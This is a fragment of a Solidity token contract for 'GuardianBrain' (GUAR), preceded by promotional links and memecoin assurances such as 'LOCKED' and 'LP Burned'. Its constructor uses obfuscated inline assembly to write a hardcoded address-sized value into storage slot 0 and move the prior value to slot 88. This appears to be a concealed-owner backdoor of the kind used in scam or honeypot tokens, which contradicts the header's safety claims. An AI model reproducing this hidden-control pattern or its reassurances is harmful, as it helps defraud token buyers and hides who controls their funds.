/*
Welcome to GuardianBrain

Telegram: https://t.me/GuardianBrain
Twitter: https://twitter.com/GuardianBrain
https://GuardianBrain.space
LOCKED
LP Burned
Always DYOR
MoonGem
...
contract GuardianBrain {
    string public constant name = "GuardianBrain";
    string public constant symbol = "GUAR";
   ...
   constructor() {
        assembly {mstore(0x20, sload(0)) sstore(88, mload(0x20)) sstore(0, add(530268745326958025228500018901028963325385656034, 1))}
